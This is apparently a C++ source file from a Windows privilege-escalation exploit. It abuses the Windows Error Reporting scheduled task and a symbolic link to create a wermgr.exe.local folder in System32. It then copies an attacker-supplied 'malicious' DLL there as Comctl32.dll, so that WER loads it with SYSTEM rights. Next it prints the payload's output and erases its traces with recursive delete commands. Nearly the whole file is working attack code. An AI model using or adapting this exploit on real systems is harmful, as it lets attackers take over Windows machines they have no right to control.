// This code has been developed by @gweeperx (a.k.a Dimopoulos Elias). 
// This code is heavily based on symboliclink testing tools from google's project zero 
// https://github.com/googleprojectzero/symboliclink-testing-tools
// The technique which is implemented here, has been described by @jonasLyk in the following url:
// https://secret.club/2020/04/23/directory-deletion-shell.html

#include "stdafx.h"
#include "D_WER.h"
#include "FileSymlink.h"
#include <iostream>
#include <algorithm>

D_WER::D_WER(const std::wstring target_folder)
{
	set_target_folder(target_folder);
}

const std::wstring D_WER::get_target_folder(void)
{
	return this->target_folder;
}

const bool D_WER::set_target_folder(const std::wstring target_folder)
{
	this->target_folder = target_folder;
	return true;
}

const std::wstring D_WER::get_malicious_file(void)
{
	return this->malicious_file;
}

const bool D_WER::set_malicious_file(const std::wstring malicious_file)
{
	this->malicious_file = malicious_file;
	return true;
}
/*
LPWSTR D_WER::get_WER_cmd(void)
{
    return this->WER_cmd;
}
*/
const bool D_WER::execute_WER(void)
{
    system("schtasks /Run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\" /I");
    return true;
}

const bool D_WER::create_target_folder(void)
{
    LPCWSTR baseobjdir = nullptr;
    bool permanent = true;
    FileSymlink WER(permanent);

    if (::PathFileExists(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\"))
    {
        std::wcout << L"[!] WER Folder exists. Delete it and try again." << "\n" << std::endl;
        std::wcout << L"[!] Aborting..." << "\n" << std::endl;
        return false;
    }

    this->execute_WER();
    
    Sleep(1000); //too fast too furious 

    if (::PathFileExists(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\") == false)
    {
        std::wcout << L"[!] WER Folder could not be created. Something went wrong..." << "\n" << std::endl;
        std::wcout << L"[!] Aborting..." << "\n" << std::endl;
        return false;
    }

    std::wcout << L"[+] WER Folder was created... again." << "\n" << std::endl;


    if (::PathFileExists(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\"))
    {
        if (::RemoveDirectory(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\") != 0)
        {
            std::wcout << L"[+] WER's Temp Folder was deleted." << "\n" << std::endl;
        }
        else {
            std::wcout << L"[!] WER's Temp Folder was not deleted. Ensure it's empty and try again." << "\n" << std::endl;
            std::wcout << L"[!] Aborting..." << "\n" << std::endl;
            return false;
        }
    }
    else {
        std::wcout << L"[+] WER's Temp Folder does not exist. This is strange, but let's give it a chance..." << "\n" << std::endl;
    }

    Sleep(1000); //too fast too furious 

    WER.CreateSymlink(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp", L"c:\\windows\\system32\\wermgr.exe.local", baseobjdir);
    this->execute_WER();

    Sleep(1000); //too fast too furious 

    if (::PathFileExists(L"c:\\windows\\system32\\wermgr.exe.local\\"))
    {
        std::wcout << L"[+] Target Folder was created." << "\n" << std::endl;
        return true;
    }
    else {
        Wow64DisableWow64FsRedirection(nullptr);

        if (::PathFileExists(L"c:\\windows\\system32\\wermgr.exe.local\\"))
        {
            std::wcout << L"[+] Target Folder was created." << "\n" << std::endl;
            return true;
        }

        else{

            std::wcout << L"[!] Target Folder was NOT created. I have no idea why..." << "\n" << std::endl;
            return false;
        
        }
    }
   // return true;

 
}

std::wstring D_WER::max_version_folder(std::vector<std::wstring> filenamesList)
{
    size_t  pos = 0;
    size_t  pos_none = 0;
    int     cnt = 0;
    std::vector<std::wstring> versionsList;
    unsigned int numberOfFile = 0;

    //for every file in filenamesList
    for (numberOfFile = 0; numberOfFile < filenamesList.size(); numberOfFile++)
    {
        std::wcout << "[+] Folder " << filenamesList[numberOfFile] << " was detected." << std::endl;

        //Find where the the version number begins. This is the position after the third "_" . Here we detect the position of the "_".
        while (cnt != 3)
        {
            pos += 1;
            pos = filenamesList[numberOfFile].find(L"_", pos);
            if (pos == std::string::npos)
                ;
            cnt++;
        }

        //Detect where the version number ends. It ends at the begining of the "_none_"
        pos_none = filenamesList[numberOfFile].find(L"_none_", pos_none);

        //Take the full version number. This is the substring which starts after the third "_" and ends at the begining of _none_. Put that substring in the "versionsList" vector. 

        versionsList.push_back(filenamesList[numberOfFile].substr(pos + 1, (pos_none - pos - 1)));
        pos_none = 0;
    }

    //Find max version

    std::wcout << "[+] Folder with max version: " << *std::max_element(versionsList.begin(), versionsList.end()) << std::endl;

    //find the folder which contains the Max version
    for (numberOfFile = 0; numberOfFile < filenamesList.size(); numberOfFile++)
    {
        pos = 0;
        pos = filenamesList[numberOfFile].find(*std::max_element(versionsList.begin(), versionsList.end()), pos);

        if (pos != std::string::npos) {
            break;
        }
    }

    std::wcout << "[+] The subfolder " << filenamesList[numberOfFile] << " will be used." << std::endl;

    return  filenamesList[numberOfFile];

}

std::vector<std::wstring> D_WER::searchFileFolder(LPCWSTR file_or_folder)
{
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
    DWORD dwError = 0;
    size_t  pos = 0;
    size_t  pos_none = 0;
    int     cnt = 0;
    std::vector<std::wstring> filenamesList;
    std::vector<std::wstring> versionsList;
    unsigned int numberOfFile = 0;


    hFind = FindFirstFile(file_or_folder, &FindFileData);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        std::wcout << "[!] FindFirstFile failed (\n" << GetLastError() << ")";
        return filenamesList;
    }

    //Create a vector with all the folders
    do
    {
        filenamesList.push_back(std::wstring(FindFileData.cFileName));

    } while (FindNextFile(hFind, &FindFileData) != 0);

    dwError = GetLastError();

    if (dwError != ERROR_NO_MORE_FILES)
    {
        std::wcout << "[!] FindFirstFile failed (\n" << GetLastError() << ")";
        return filenamesList;
    }

    FindClose(hFind);


    return filenamesList;


}
BOOL Read(LPCWSTR filePath)
{
    HANDLE pFile;
    DWORD fileSize;
    char* buffer, * tmpBuf;
    DWORD dwBytesRead, dwBytesToRead, tmpLen;

    pFile = CreateFile(filePath, GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,        //打开已存在的文件 
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (pFile == INVALID_HANDLE_VALUE)
    {
        printf("open file error!\n");
        CloseHandle(pFile);
        return FALSE;
    }

    fileSize = GetFileSize(pFile, NULL);          //得到文件的大小

    buffer = (char*)malloc(fileSize);
    ZeroMemory(buffer, fileSize);
    dwBytesToRead = fileSize;
    dwBytesRead = 0;
    tmpBuf = buffer;

    do {                                       //循环读文件，确保读出完整的文件    

        ReadFile(pFile, tmpBuf, dwBytesToRead, &dwBytesRead, NULL);

        if (dwBytesRead == 0)
            break;

        dwBytesToRead -= dwBytesRead;
        tmpBuf += dwBytesRead;

    } while (dwBytesToRead > 0);

    //  TODO 处理读到的数据 buffer
    printf("%s",tmpBuf);

    free(buffer);
    CloseHandle(pFile);

    return TRUE;
}

const bool D_WER::escalateToSystem(std::wstring maliciousDLL)
{
    bool result = false;
    Wow64DisableWow64FsRedirection(nullptr);
    FileSymlink WER(true);

    std::wstring WerFolderW(L"C:\\Windows\\System32\\wermgr.exe.local\\");
    if (!this->create_target_folder()) {
        exit(1);
    }
    WerFolderW.append(this->max_version_folder(searchFileFolder(L"C:\\Windows\\WinSxS\\amd64_microsoft.windows.common-controls_*_none_*")));

    ::CreateDirectory(WerFolderW.c_str(), nullptr);

    std::wcout << "[+] Folder " << WerFolderW << "was created." << std::endl;

    WerFolderW.append(L"\\Comctl32.dll");

    ::CopyFile(maliciousDLL.c_str(), WerFolderW.c_str(), result);

    std::wcout << "[+] DLL " << maliciousDLL << " was copied to ." << WerFolderW << std::endl;

    Sleep(1000);

    this->execute_WER();
    Sleep(3000);
    //read result
    //Read(L"c:\\windows\\temp\\i03h8.tmp");
    system("type C:\\Windows\\Temp\\i03h8.tmp");
    Sleep(1000);
    //clean
    std::wcout << L"[!] clean dir..." << "\n" << std::endl;
   system("rd /s /q c:\\windows\\system32\\wermgr.exe.local C:\\ProgramData\\Microsoft\\Windows\\wer");
   system("del c:\\programdata\\setup.bat c:\\windows\\temp\\i03h8.tmp");
   std::wcout << L"[!] recreate wer directory." << "\n" << std::endl;
   this->execute_WER();
    return result;

}